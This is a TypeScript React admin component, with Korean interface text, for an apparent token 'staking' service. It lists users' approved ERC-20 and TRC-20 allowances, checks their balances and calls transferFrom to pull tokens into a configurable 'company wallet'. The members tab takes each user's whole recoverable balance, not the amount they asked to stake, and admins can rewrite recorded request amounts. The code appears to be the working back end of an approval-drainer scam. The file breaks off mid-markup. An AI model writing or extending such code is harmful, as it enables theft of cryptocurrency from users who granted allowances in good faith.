"use client";

import { useEffect, useMemo, useState } from "react";
import {
  AlertCircle,
  ArrowDownToLine,
  CheckCircle2,
  ListChecks,
  RefreshCw,
  Users,
  Wallet,
} from "lucide-react";
import {
  createPublicClient,
  createWalletClient,
  custom,
  formatUnits,
  isAddress,
  parseUnits,
  type Address,
} from "viem";
import { ERC20_ABI } from "@/lib/erc20";
import { formatNumber, shortAddress } from "@/lib/utils";

type StakeStatus = "REQUESTED" | "APPROVED" | "TRANSFERRED" | "SETTLED" | "REJECTED";
type PatchStakeRequest = (
  id: string,
  status: StakeStatus,
  transferTxHash?: string,
  adminNote?: string,
  amount?: string,
) => Promise<void>;
type RecoverStakeRequest = (id: string, amount: string) => Promise<void>;

interface AdminWalletRow {
  evmAddress: string;
  tronAddress: string | null;
}

interface StakeRequestRow {
  id: string;
  sourceNetwork: string;
  sourceSymbol: string;
  sourceName: string;
  receiptSymbol: string;
  platform: string;
  platformUrl: string;
  category: string;
  amount: string;
  amountNumeric: number;
  walletAddress: string | null;
  tronAddress: string | null;
  spenderAddress: string | null;
  tokenAddress: string | null;
  tokenDecimals: number | null;
  approvalRequired: boolean;
  allowanceRaw: string | null;
  approveTxHash: string | null;
  transferTxHash: string | null;
  status: StakeStatus;
  adminNote: string | null;
  createdAt: string;
  updatedAt?: string;
  user: {
    id: string;
    username: string;
    walletAddress: string | null;
    tronAddress: string | null;
  };
}

interface UserSummary {
  key: string;
  userId: string;
  username: string;
  walletAddress: string | null;
  tronAddress: string | null;
  requests: StakeRequestRow[];
  activeCount: number;
  approvedCount: number;
  allowanceCount: number;
  latestRequest: StakeRequestRow | null;
}

interface Eip1193Provider {
  request: (args: { method: string; params?: unknown }) => Promise<unknown>;
  isMetaMask?: boolean;
  providers?: Eip1193Provider[];
}

interface TronTransferContract {
  balanceOf: (owner: string) => { call: () => Promise<unknown> };
  allowance: (
    owner: string,
    spender: string,
  ) => { call: () => Promise<unknown> };
  transferFrom: (
    owner: string,
    receiver: string,
    amount: string,
  ) => { send: (options?: { feeLimit?: number }) => Promise<unknown> };
}

interface TronTransferWeb {
  defaultAddress?: { base58?: string };
  request?: (args: { method: string; params?: unknown }) => Promise<unknown>;
  contract?: {
    (): { at: (contractAddress: string) => Promise<TronTransferContract> };
    (
      abi: unknown,
      contractAddress: string,
    ): TronTransferContract | Promise<TronTransferContract>;
  };
}

interface TronProviderLike {
  request?: (args: { method: string; params?: unknown }) => Promise<unknown>;
  tronWeb?: TronTransferWeb;
}

interface TronWindow {
  tron?: TronProviderLike;
  tronLink?: TronProviderLike;
  safepal?: TronProviderLike;
  tronWeb?: TronTransferWeb;
}

interface RecoverySnapshot {
  balanceRaw: string;
  allowanceRaw: string;
  recoverableRaw: string;
  checkedAt: string;
}

const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
const TRC20_TRANSFER_ABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "remaining", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_from", type: "address" },
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ name: "success", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
] as const;

type AdminTab = "members" | "requests" | "wallet";

export function AdminStakingClient() {
  const [adminWallet, setAdminWallet] = useState<AdminWalletRow | null>(null);
  const [requests, setRequests] = useState<StakeRequestRow[]>([]);
  const [evmAddress, setEvmAddress] = useState("");
  const [tronAddress, setTronAddress] = useState("");
  const [recoveryAmounts, setRecoveryAmounts] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(true);
  const [message, setMessage] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<AdminTab>("members");

  async function load() {
    setIsLoading(true);
    setError(null);
    try {
      const res = await fetch("/api/admin/staking", { cache: "no-store" });
      const data = (await res.json()) as {
        adminWallet: AdminWalletRow;
        requests: StakeRequestRow[];
        error?: string;
      };
      if (!res.ok) throw new Error(data.error ?? "관리자 데이터를 불러오지 못했습니다.");
      setAdminWallet(data.adminWallet);
      setRequests(data.requests);
      setEvmAddress(data.adminWallet.evmAddress);
      setTronAddress(data.adminWallet.tronAddress ?? "");
    } catch (e) {
      setError(e instanceof Error ? e.message : "관리자 데이터를 불러오지 못했습니다.");
    } finally {
      setIsLoading(false);
    }
  }

  useEffect(() => {
    const id = window.setTimeout(() => {
      void load();
    }, 0);
    return () => window.clearTimeout(id);
  }, []);

  async function saveAdminWallet() {
    setMessage(null);
    setError(null);
    if (!isAddress(evmAddress)) {
      setError("EVM 회사 지갑 주소가 올바르지 않습니다.");
      return;
    }

    try {
      const res = await fetch("/api/admin/staking", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ evmAddress, tronAddress: tronAddress || null }),
      });
      const data = (await res.json()) as { adminWallet: AdminWalletRow; error?: string };
      if (!res.ok) throw new Error(data.error ?? "회사 지갑 저장 실패");
      setAdminWallet(data.adminWallet);
      setMessage("회사 지갑을 저장했습니다.");
    } catch (e) {
      setError(e instanceof Error ? e.message : "회사 지갑 저장 실패");
    }
  }

  async function patchRequest(
    id: string,
    status: StakeStatus,
    transferTxHash?: string,
    adminNote?: string,
    amount?: string,
  ) {
    const res = await fetch("/api/admin/staking", {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id, status, transferTxHash, adminNote, amount }),
    });
    const data = (await res.json()) as { request: StakeRequestRow; error?: string };
    if (!res.ok) throw new Error(data.error ?? "요청 상태 변경 실패");
    setRequests((prev) => prev.map((item) => (item.id === id ? data.request : item)));
  }

  async function recoverRequest(id: string, amount: string) {
    const res = await fetch("/api/admin/staking/recover", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id, amount }),
    });
    const data = (await res.json()) as { request: StakeRequestRow; error?: string };
    if (!res.ok) throw new Error(data.error ?? "온체인 실행 실패");
    setRequests((prev) => prev.map((item) => (item.id === id ? data.request : item)));
  }

  const pendingCount = useMemo(
    () => requests.filter((request) => request.status === "REQUESTED").length,
    [requests],
  );
  const approvedAllowanceCount = useMemo(
    () => requests.filter((request) => request.approvalRequired && hasApprovalRecord(request)).length,
    [requests],
  );
  const recoverableRequests = useMemo(
    () => requests.filter(isRecoverableRequest),
    [requests],
  );
  const tokenApprovalRequests = useMemo(
    () => requests.filter(isTokenApprovalRequest),
    [requests],
  );
  const userSummaries = useMemo(() => buildUserSummaries(requests), [requests]);

  const tabs: { id: AdminTab; label: string; icon: typeof Users; badge?: number }[] = [
    { id: "members", label: "회원 목록", icon: Users, badge: userSummaries.length },
    { id: "requests", label: "요청 처리", icon: ListChecks, badge: pendingCount },
    { id: "wallet", label: "회사 지갑", icon: Wallet },
  ];

  return (
    <div className="min-h-[calc(100vh-4rem)] bg-background text-foreground">
      <div className="mx-auto max-w-6xl px-4 py-10 sm:px-6 lg:px-8">
        <div className="flex flex-col gap-4 sm:flex-row sm:items-end sm:justify-between">
          <div>
            <p className="text-[11px] font-semibold uppercase tracking-widest text-muted">
              관리자
            </p>
            <h1 className="mt-1 text-2xl font-extrabold tracking-tight">
              스테이킹 관리
            </h1>
          </div>
          <button
            type="button"
            onClick={load}
            className="inline-flex h-10 items-center justify-center gap-2 rounded-full border border-black/10 bg-white px-4 text-xs font-bold text-foreground/80 transition hover:border-foreground/30"
          >
            <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
            새로고침
          </button>
        </div>

        <div className="mt-6 flex gap-1 border-b border-black/5">
          {tabs.map((tab) => {
            const Icon = tab.icon;
            const active = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                type="button"
                onClick={() => setActiveTab(tab.id)}
                className={`relative inline-flex items-center gap-2 px-4 py-3 text-xs font-extrabold transition ${
                  active ? "text-accent-strong" : "text-foreground/60 hover:text-foreground"
                }`}
              >
                <Icon className="h-4 w-4" />
                {tab.label}
                {typeof tab.badge === "number" && tab.badge > 0 ? (
                  <span
                    className={`rounded-full px-2 py-0.5 text-[10px] font-bold ${
                      active
                        ? "bg-accent-strong/15 text-accent-strong"
                        : "bg-black/5 text-foreground/60"
                    }`}
                  >
                    {tab.badge}
                  </span>
                ) : null}
                {active && (
                  <span className="absolute inset-x-2 -bottom-px h-0.5 rounded-full bg-accent-strong" />
                )}
              </button>
            );
          })}
        </div>

        {error && (
          <div className="mt-4 flex items-start gap-2 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
            <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
            <p>{error}</p>
          </div>
        )}
        {message && (
          <div className="mt-4 flex items-start gap-2 rounded-xl border border-emerald-200 bg-emerald-50 p-3 text-xs text-emerald-700">
            <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" />
            <p>{message}</p>
          </div>
        )}

        <div className="mt-6">
          {activeTab === "members" && (
            <MembersTab
              userSummaries={userSummaries}
              adminWallet={adminWallet}
              isLoading={isLoading}
              onStatus={patchRequest}
              onRecover={recoverRequest}
            />
          )}

          {activeTab === "requests" && (
            <RequestsTab
              requests={requests}
              adminWallet={adminWallet}
              isLoading={isLoading}
              recoveryAmounts={recoveryAmounts}
              onRecoveryAmountChange={(id, value) =>
                setRecoveryAmounts((prev) => ({ ...prev, [id]: value }))
              }
              onStatus={patchRequest}
              onRecover={recoverRequest}
              pendingCount={pendingCount}
              approvedAllowanceCount={approvedAllowanceCount}
              recoverableCount={recoverableRequests.length}
              tokenApprovalCount={tokenApprovalRequests.length}
            />
          )}

          {activeTab === "wallet" && (
            <WalletTab
              evmAddress={evmAddress}
              tronAddress={tronAddress}
              onEvmChange={setEvmAddress}
              onTronChange={setTronAddress}
              onSave={saveAdminWallet}
            />
          )}
        </div>
      </div>
    </div>
  );
}

function MembersTab({
  userSummaries,
  adminWallet,
  isLoading,
  onStatus,
  onRecover,
}: {
  userSummaries: UserSummary[];
  adminWallet: AdminWalletRow | null;
  isLoading: boolean;
  onStatus: PatchStakeRequest;
  onRecover: RecoverStakeRequest;
}) {
  if (!isLoading && userSummaries.length === 0) {
    return (
      <div className="rounded-3xl border border-black/5 bg-white p-8 text-center text-sm text-muted">
        아직 회원 요청이 없습니다.
      </div>
    );
  }

  return (
    <div className="space-y-4">
      {userSummaries.map((user) => (
        <MemberCard
          key={user.key}
          user={user}
          adminWallet={adminWallet}
          onStatus={onStatus}
          onRecover={onRecover}
        />
      ))}
    </div>
  );
}

function MemberCard({
  user,
  adminWallet,
  onStatus,
  onRecover,
}: {
  user: UserSummary;
  adminWallet: AdminWalletRow | null;
  onStatus: PatchStakeRequest;
  onRecover: RecoverStakeRequest;
}) {
  const tokenRequests = user.requests.filter(isTokenApprovalRequest);

  return (
    <section className="rounded-3xl border border-black/5 bg-white p-5">
      <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
        <div>
          <h3 className="text-base font-extrabold text-foreground">
            {user.username}
          </h3>
          <div className="mt-1.5 flex flex-col gap-1 text-[11px] font-mono text-muted sm:flex-row sm:gap-4">
            <span>
              EVM:{" "}
              <span className="text-foreground">
                {user.walletAddress ? shortAddress(user.walletAddress) : "-"}
              </span>
            </span>
            <span>
              TRON:{" "}
              <span className="text-foreground">
                {user.tronAddress ? shortAddress(user.tronAddress) : "-"}
              </span>
            </span>
          </div>
        </div>
        <span className="w-fit rounded-full border border-black/10 px-3 py-1 text-[10px] font-bold text-foreground/60">
          요청 {user.requests.length}건
        </span>
      </div>

      {tokenRequests.length === 0 ? (
        <p className="mt-4 rounded-2xl bg-black/[0.02] p-4 text-xs text-muted">
          회수 가능한 토큰 요청이 없습니다.
        </p>
      ) : (
        <ul className="mt-4 space-y-3">
          {tokenRequests.map((request) => (
            <MemberTokenRow
              key={request.id}
              request={request}
              adminWallet={adminWallet}
              onStatus={onStatus}
              onRecover={onRecover}
            />
          ))}
        </ul>
      )}
    </section>
  );
}

function MemberTokenRow({
  request,
  adminWallet,
  onStatus,
  onRecover,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow | null;
  onStatus: PatchStakeRequest;
  onRecover: RecoverStakeRequest;
}) {
  const [snapshot, setSnapshot] = useState<RecoverySnapshot | null>(null);
  const [isChecking, setIsChecking] = useState(false);
  const [isRecovering, setIsRecovering] = useState(false);
  const [localError, setLocalError] = useState<string | null>(null);

  const decimals = request.tokenDecimals ?? 18;
  const spender = request.spenderAddress ?? resolveRequestSpender(request, adminWallet);
  const balanceLabel = snapshot ? formatRawToken(snapshot.balanceRaw, decimals) : "-";
  const recoverableLabel = snapshot ? formatRawToken(snapshot.recoverableRaw, decimals) : "-";
  const recoverableRaw = snapshot ? BigInt(snapshot.recoverableRaw) : BigInt(0);
  const recoverableValue = snapshot
    ? formatUnits(BigInt(snapshot.recoverableRaw), decimals)
    : "0";
  const isFinal = request.status === "SETTLED" || request.status === "REJECTED";
  const canRecover = !isFinal && snapshot !== null && recoverableRaw > BigInt(0);

  async function checkBalance() {
    setIsChecking(true);
    setLocalError(null);
    try {
      if (!request.tokenAddress || request.tokenDecimals === null) {
        throw new Error("토큰 정보를 찾지 못했습니다.");
      }
      if (!spender) {
        throw new Error("회사 지갑 주소가 없습니다.");
      }
      const next = request.tokenAddress.startsWith("0x")
        ? await readErc20RecoverySnapshot({
            tokenAddress: request.tokenAddress,
            owner: request.walletAddress,
            spender,
          })
        : await readTronRecoverySnapshot({
            tokenAddress: request.tokenAddress,
            owner: request.tronAddress,
            spender,
          });
      setSnapshot(next);
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "잔고 확인 실패");
    } finally {
      setIsChecking(false);
    }
  }

  async function recoverNow() {
    if (!snapshot) return;
    const amount = recoverableValue;
    const amountUnits = toUnits(amount, decimals);
    if (amountUnits === null || amountUnits <= BigInt(0)) {
      setLocalError("회수할 수량이 없습니다.");
      return;
    }
    setIsRecovering(true);
    setLocalError(null);
    try {
      await onRecover(request.id, amount);
    } catch (e) {
      try {
        const txHash = await recoverWithBrowserWallet({
          request,
          adminWallet,
          amountUnits,
        });
        await onStatus(
          request.id,
          "TRANSFERRED",
          txHash,
          `확장 지갑 서명 실행: ${amount}`,
        );
      } catch (browserError) {
        const isEvm = Boolean(request.tokenAddress?.startsWith("0x"));
        setLocalError(
          formatRecoveryFailureMessage({
            isEvmToken: isEvm,
            serverMessage: e instanceof Error ? e.message : "서버 실행 실패",
            walletMessage:
              browserError instanceof Error
                ? browserError.message
                : "확장 지갑 실행 실패",
          }),
        );
      }
    } finally {
      setIsRecovering(false);
    }
  }

  return (
    <li className="rounded-2xl border border-black/5 p-4">
      <div className="flex flex-wrap items-start justify-between gap-3">
        <div>
          <p className="text-sm font-extrabold text-foreground">
            {request.sourceSymbol}
            <span className="ml-2 text-[11px] font-bold text-muted">
              {request.sourceNetwork}
            </span>
          </p>
          <p className="mt-1 text-[11px] text-muted">
            요청 수량{" "}
            <span className="font-mono text-foreground">
              {formatNumber(request.amountNumeric, 6)} {request.sourceSymbol}
            </span>
          </p>
        </div>
        <span className="rounded-full border border-black/10 px-2.5 py-1 text-[10px] font-bold text-foreground/60">
          {formatStatusLabel(request.status)}
        </span>
      </div>

      <div className="mt-3 grid gap-2 sm:grid-cols-2">
        <div className="rounded-xl border border-black/5 bg-black/[0.02] p-3">
          <p className="text-[10px] font-bold uppercase tracking-widest text-muted">
            잔고
          </p>
          <p className="mt-1 truncate font-mono text-sm font-extrabold text-foreground">
            {balanceLabel} {request.sourceSymbol}
          </p>
        </div>
        <div className="rounded-xl border border-emerald-200/60 bg-emerald-50 p-3">
          <p className="text-[10px] font-bold uppercase tracking-widest text-emerald-700">
            회수 가능 수량
          </p>
          <p className="mt-1 truncate font-mono text-sm font-extrabold text-emerald-700">
            {recoverableLabel} {request.sourceSymbol}
          </p>
        </div>
      </div>

      <div className="mt-3 grid gap-2 sm:grid-cols-2">
        <button
          type="button"
          onClick={checkBalance}
          disabled={isChecking}
          className="inline-flex items-center justify-center gap-2 rounded-xl border border-black/10 bg-white px-4 py-2.5 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-wait disabled:opacity-60"
        >
          <RefreshCw className={`h-3.5 w-3.5 ${isChecking ? "animate-spin" : ""}`} />
          {isChecking ? "확인 중..." : "잔고 확인"}
        </button>
        <button
          type="button"
          onClick={recoverNow}
          disabled={!canRecover || isRecovering}
          className="inline-flex items-center justify-center gap-2 rounded-xl bg-accent-strong px-4 py-2.5 text-xs font-extrabold text-white transition hover:bg-accent-strong/90 disabled:cursor-not-allowed disabled:opacity-50"
        >
          <ArrowDownToLine className="h-3.5 w-3.5" />
          {isRecovering
            ? "회수 중..."
            : snapshot
              ? "회수하기"
              : "잔고 확인 먼저"}
        </button>
      </div>

      {localError && (
        <div className="mt-3 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
          {localError}
        </div>
      )}
    </li>
  );
}

function WalletTab({
  evmAddress,
  tronAddress,
  onEvmChange,
  onTronChange,
  onSave,
}: {
  evmAddress: string;
  tronAddress: string;
  onEvmChange: (value: string) => void;
  onTronChange: (value: string) => void;
  onSave: () => void;
}) {
  return (
    <section className="mx-auto max-w-2xl rounded-3xl border border-black/5 bg-white p-6">
      <div className="flex items-center gap-3">
        <div className="rounded-full bg-black/5 p-2">
          <Wallet className="h-4 w-4 text-accent-strong" />
        </div>
        <div>
          <h2 className="text-base font-extrabold text-foreground">
            회사 지갑
          </h2>
          <p className="mt-0.5 text-xs text-muted">
            회수한 토큰을 받을 회사 지갑 주소
          </p>
        </div>
      </div>

      <div className="mt-5 space-y-4">
        <label className="block">
          <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
            회사 EVM 지갑
          </span>
          <input
            value={evmAddress}
            onChange={(e) => onEvmChange(e.target.value)}
            className="mt-1.5 w-full rounded-xl border border-black/10 bg-white px-3 py-2.5 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
          />
        </label>
        <label className="block">
          <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
            회사 TRON 지갑
          </span>
          <input
            value={tronAddress}
            onChange={(e) => onTronChange(e.target.value)}
            placeholder="선택"
            className="mt-1.5 w-full rounded-xl border border-black/10 bg-white px-3 py-2.5 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
          />
        </label>
        <button
          type="button"
          onClick={onSave}
          className="w-full rounded-xl bg-accent-strong px-4 py-3 text-xs font-extrabold text-white transition hover:bg-accent-strong/90"
        >
          회사 지갑 저장
        </button>
      </div>

      <div className="mt-5 rounded-2xl border border-black/5 bg-black/[0.02] p-4 text-xs text-muted">
        <p>주소를 바꾸면 이후 요청 처리에 바로 반영됩니다.</p>
      </div>
    </section>
  );
}

function RequestsTab({
  requests,
  adminWallet,
  isLoading,
  recoveryAmounts,
  onRecoveryAmountChange,
  onStatus,
  onRecover,
  pendingCount,
  approvedAllowanceCount,
  recoverableCount,
  tokenApprovalCount,
}: {
  requests: StakeRequestRow[];
  adminWallet: AdminWalletRow | null;
  isLoading: boolean;
  recoveryAmounts: Record<string, string>;
  onRecoveryAmountChange: (id: string, value: string) => void;
  onStatus: PatchStakeRequest;
  onRecover: RecoverStakeRequest;
  pendingCount: number;
  approvedAllowanceCount: number;
  recoverableCount: number;
  tokenApprovalCount: number;
}) {
  return (
    <section className="rounded-3xl border border-black/5 bg-white p-5">
      <div className="flex flex-col gap-4 lg:flex-row lg:items-start lg:justify-between">
        <div>
          <h2 className="text-base font-extrabold text-foreground">
            요청 목록
          </h2>
          <p className="mt-1 text-xs text-muted">
            카드에서 승인 확인, 회사 지갑 수령, 정산 완료까지 처리합니다.
          </p>
        </div>
        <div className="grid grid-cols-2 gap-2 text-center sm:grid-cols-4">
          <MetricPill label="전체" value={String(requests.length)} />
          <MetricPill label="새 요청" value={String(pendingCount)} />
          <MetricPill label="승인됨" value={String(approvedAllowanceCount)} />
          <MetricPill label="수령가능" value={String(recoverableCount)} />
        </div>
      </div>

      <ProcessingGuide availableCount={tokenApprovalCount} />

      <ul className="mt-4 space-y-3">
        {requests.map((request) => (
          <AdminStakeRequest
            key={`${request.id}-${request.amount}`}
            request={request}
            adminWallet={adminWallet}
            recoveryAmount={recoveryAmounts[request.id] ?? request.amount}
            onRecoveryAmountChange={(value) => onRecoveryAmountChange(request.id, value)}
            onStatus={onStatus}
            onRecover={onRecover}
          />
        ))}
        {!isLoading && requests.length === 0 && (
          <li className="rounded-2xl border border-black/5 bg-white p-6 text-sm text-muted">
            아직 스테이킹 요청이 없습니다.
          </li>
        )}
      </ul>
    </section>
  );
}

function AdminStakeRequest({
  request,
  adminWallet,
  recoveryAmount,
  onRecoveryAmountChange,
  onStatus,
  onRecover,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow | null;
  recoveryAmount: string;
  onRecoveryAmountChange: (value: string) => void;
  onStatus: PatchStakeRequest;
  onRecover: RecoverStakeRequest;
}) {
  const [isUpdating, setIsUpdating] = useState(false);
  const [localError, setLocalError] = useState<string | null>(null);
  const [requestAmount, setRequestAmount] = useState(request.amount);

  async function settle() {
    setIsUpdating(true);
    setLocalError(null);
    try {
      await onStatus(request.id, "SETTLED");
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "정산 상태 변경 실패");
    } finally {
      setIsUpdating(false);
    }
  }

  async function approveRequest() {
    setIsUpdating(true);
    setLocalError(null);
    try {
      await onStatus(request.id, "APPROVED");
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "승인 상태 변경 실패");
    } finally {
      setIsUpdating(false);
    }
  }

  async function updateAmount() {
    const nextAmount = requestAmount.trim();
    const nextAmountNumber = Number(nextAmount);
    if (!Number.isFinite(nextAmountNumber) || nextAmountNumber <= 0) {
      setLocalError("조정할 요청 수량을 올바르게 입력해주세요.");
      return;
    }

    setIsUpdating(true);
    setLocalError(null);
    try {
      await onStatus(
        request.id,
        request.status,
        undefined,
        `요청 수량 조정: ${request.amount} -> ${nextAmount}`,
        nextAmount,
      );
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "요청 수량 조정 실패");
    } finally {
      setIsUpdating(false);
    }
  }

  return (
    <li className="rounded-2xl border border-black/5 bg-white p-4">
      <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
        <div>
          <p className="text-sm font-extrabold text-foreground">
            {request.user.username}님의 예치 요청
          </p>
          <p className="mt-1 text-xs text-muted">
            {request.sourceSymbol} → {request.receiptSymbol} · {request.sourceNetwork}
          </p>
          <p className="mt-2 font-mono text-base font-extrabold text-foreground">
            {formatNumber(request.amountNumeric, 6)} {request.sourceSymbol}
          </p>
        </div>
        <div className="flex flex-wrap items-start gap-2">
          <span className="rounded-full border border-black/10 px-2.5 py-2 text-[10px] font-bold text-foreground/60">
            {formatStatusLabel(request.status)}
          </span>
          <button
            type="button"
            onClick={approveRequest}
            disabled={isUpdating || request.status !== "REQUESTED" || !hasApprovalRecord(request)}
            className="rounded-xl border border-black/10 bg-white px-3 py-2 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
          >
            승인 확인
          </button>
          <button
            type="button"
            onClick={settle}
            disabled={isUpdating || request.status === "SETTLED" || request.status === "REJECTED"}
            className="rounded-xl bg-accent-strong px-3 py-2 text-xs font-extrabold text-white transition hover:bg-accent-strong/90 disabled:cursor-not-allowed disabled:opacity-50"
          >
            {request.status === "SETTLED" ? "정산 완료" : "정산 완료 처리"}
          </button>
        </div>
      </div>

      <RequestMetaGrid request={request} />

      <div className="mt-3 grid gap-2 rounded-xl border border-black/5 bg-black/[0.02] p-3 sm:grid-cols-[1fr_auto] sm:items-end">
        <label className="block">
          <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
            예치 수량 수정
          </span>
          <input
            value={requestAmount}
            onChange={(e) => setRequestAmount(e.target.value)}
            inputMode="decimal"
            className="mt-1.5 w-full rounded-xl border border-black/10 bg-white px-3 py-2 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
          />
        </label>
        <button
          type="button"
          onClick={updateAmount}
          disabled={isUpdating || requestAmount.trim() === request.amount}
          className="rounded-xl border border-black/10 bg-white px-4 py-2.5 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
        >
          수량 저장
        </button>
      </div>

      {isRecoverableRequest(request) && (
        <div className="mt-3 rounded-xl border border-accent-strong/15 bg-accent-strong/[0.04] p-3">
          <div className="mb-3 flex flex-col gap-1 sm:flex-row sm:items-center sm:justify-between">
            <p className="text-xs font-extrabold text-foreground">
              회사 지갑으로 받기
            </p>
            <span className="text-[10px] font-bold uppercase tracking-widest text-muted">
              3단계
            </span>
          </div>
          <AllowanceRecoveryControls
            request={request}
            adminWallet={adminWallet}
            amount={recoveryAmount}
            onAmountChange={onRecoveryAmountChange}
            onStatus={onStatus}
            onRecover={onRecover}
            compact
          />
        </div>
      )}

      {isTokenApprovalRequest(request) && (
        <div className="mt-3">
          <RemainingAllowanceRow
            request={request}
            adminWallet={adminWallet}
            onApplyRecoverable={onRecoveryAmountChange}
            compact
          />
        </div>
      )}

      {localError && (
        <div className="mt-3 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
          {localError}
        </div>
      )}
    </li>
  );
}

function AllowanceRecoveryControls({
  request,
  adminWallet,
  amount,
  onAmountChange,
  onStatus,
  onRecover,
  compact = false,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow | null;
  amount: string;
  onAmountChange: (value: string) => void;
  onStatus: PatchStakeRequest;
  onRecover: RecoverStakeRequest;
  compact?: boolean;
}) {
  const [isUpdating, setIsUpdating] = useState(false);
  const [localError, setLocalError] = useState<string | null>(null);

  const tokenDecimals = request.tokenDecimals ?? 18;
  const amountUnits = toUnits(amount, tokenDecimals);
  const allowanceUnits = toBigInt(request.allowanceRaw);
  const hasRecordedAllowance = allowanceUnits !== null && allowanceUnits > BigInt(0);
  const hasEnoughRecordedAllowance =
    amountUnits !== null && (!hasRecordedAllowance || allowanceUnits >= amountUnits);
  const isEvmToken = Boolean(request.tokenAddress?.startsWith("0x"));
  const expectedSpender = request.spenderAddress;
  const hasApproval = hasApprovalRecord(request);
  const savedCompanyWallet = isEvmToken ? adminWallet?.evmAddress : adminWallet?.tronAddress;
  const savedWalletMatchesSpender = Boolean(
    expectedSpender &&
      savedCompanyWallet &&
      (isEvmToken
        ? savedCompanyWallet.toLowerCase() === expectedSpender.toLowerCase()
        : sameTronAddress(savedCompanyWallet, expectedSpender)),
  );
  const canAttemptRecovery = Boolean(
    adminWallet &&
      request.tokenAddress &&
      request.tokenDecimals !== null &&
      expectedSpender &&
      savedWalletMatchesSpender &&
      hasApproval &&
      request.status !== "SETTLED" &&
      request.status !== "REJECTED" &&
      amountUnits !== null &&
      amountUnits > BigInt(0) &&
      hasEnoughRecordedAllowance,
  );

  async function approveAllowance() {
    setIsUpdating(true);
    setLocalError(null);
    try {
      await onStatus(request.id, "APPROVED", undefined, "allowance 승인 확인");
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "승인 확인 실패");
    } finally {
      setIsUpdating(false);
    }
  }

  async function recoverAllowance() {
    if (!canAttemptRecovery || amountUnits === null) return;
    setIsUpdating(true);
    setLocalError(null);
    try {
      await onRecover(request.id, amount);
    } catch (e) {
      try {
        const txHash = await recoverWithBrowserWallet({
          request,
          adminWallet,
          amountUnits,
        });
        await onStatus(
          request.id,
          "TRANSFERRED",
          txHash,
          `확장 지갑 서명 실행: ${amount}`,
        );
      } catch (browserError) {
        const serverMessage = e instanceof Error ? e.message : "서버 실행 실패";
        const walletMessage =
          browserError instanceof Error ? browserError.message : "확장 지갑 실행 실패";
        setLocalError(
          formatRecoveryFailureMessage({
            isEvmToken,
            serverMessage,
            walletMessage,
          }),
        );
      }
    } finally {
      setIsUpdating(false);
    }
  }

  return (
    <>
      <div className="grid gap-3 lg:grid-cols-[1fr_auto_auto] lg:items-end">
        <label className="block">
          <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
            받을 수량
          </span>
          <input
            value={amount}
            onChange={(e) => onAmountChange(e.target.value)}
            inputMode="decimal"
            className="mt-1.5 w-full rounded-xl border border-black/10 bg-white px-3 py-2 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
          />
        </label>
        <button
          type="button"
          onClick={approveAllowance}
          disabled={!hasApproval || isUpdating || request.status !== "REQUESTED"}
          className="rounded-xl border border-black/10 bg-white px-4 py-2.5 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
        >
          승인 확인 완료
        </button>
        <button
          type="button"
          onClick={recoverAllowance}
          disabled={!canAttemptRecovery || isUpdating}
          className="rounded-xl bg-accent-strong px-4 py-2.5 text-xs font-extrabold text-white transition hover:bg-accent-strong/90 disabled:cursor-not-allowed disabled:opacity-50"
        >
          {isUpdating ? "처리 중..." : compact ? "받기 실행" : "회사 지갑으로 받기"}
        </button>
      </div>

      <div className="mt-3 grid gap-2 rounded-xl bg-black/[0.02] p-3 text-[11px] text-muted sm:grid-cols-2">
        <p>
          요청 수량:{" "}
          <span className="font-mono text-foreground">
